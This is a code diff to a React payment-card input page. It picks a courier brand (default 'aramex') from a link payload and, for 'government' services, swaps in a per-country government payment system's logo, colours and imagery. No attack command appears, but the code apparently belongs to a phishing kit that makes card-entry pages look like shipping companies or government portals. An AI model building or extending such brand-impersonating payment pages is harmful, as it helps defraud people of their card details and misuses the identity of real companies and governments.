@@ -59,11 +59,28 @@ const PaymentCardInput = () => {
 
   const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const serviceBranding = getServiceBranding(serviceKey);
   
   // Check if government service and get styling
-  const isGovService = isGovernmentService(serviceKey);
+  const isGovService = isGovernmentService(serviceKey) || serviceKey.toLowerCase() === 'government_payment';
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
+
+  const branding = isGovService ? {
+    logo: govSystem.logo || serviceBranding.logo,
+    colors: {
+      primary: govSystem.colors.primary,
+      secondary: govSystem.colors.secondary,
+      text: govSystem.colors.text,
+      textLight: govSystem.colors.textLight,
+      textOnPrimary: govSystem.colors.textOnPrimary,
+      border: govSystem.colors.border,
+      surface: govSystem.colors.surface,
+      background: govSystem.colors.background,
+    },
+    ogImage: govSystem.heroImage,
+    heroImage: govSystem.heroImage,
+    description: govSystem.description
+  } : serviceBranding;
 
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
